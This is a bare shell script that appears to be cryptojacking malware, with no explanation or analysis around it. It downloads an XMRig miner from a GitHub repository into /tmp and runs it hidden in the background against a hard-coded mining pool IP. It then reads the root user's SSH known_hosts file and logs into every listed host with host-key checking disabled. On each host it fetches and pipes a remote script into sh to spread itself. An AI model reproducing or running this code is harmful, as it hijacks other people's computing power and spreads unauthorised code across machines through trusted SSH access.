wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/xmr.tar.gz
tar -xvzf ./tmp/xmr.tar.gz -C ./tmp/
cd /tmp/xmrig-6.14.1
chmod +x /tmp/xmrig-6.14.1/xmrig
nohup /tmp/xmrig-6.14.1/xmrig -o 107.182.176.159:8989 -u worker3 -p xx -t 1 -B --cpu-priority 1 --cpu-max-threads-hint=50% --nicehash >/dev/null 2>&1 &


if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://raw.githubusercontent.com/Pamentierx/xmr/main/xmr.sh||wget -q -O- https://raw.githubusercontent.com/Pamentierx/xmr/main/xmr.sh)|sh >/dev/null 2>&1 &' & done
fi

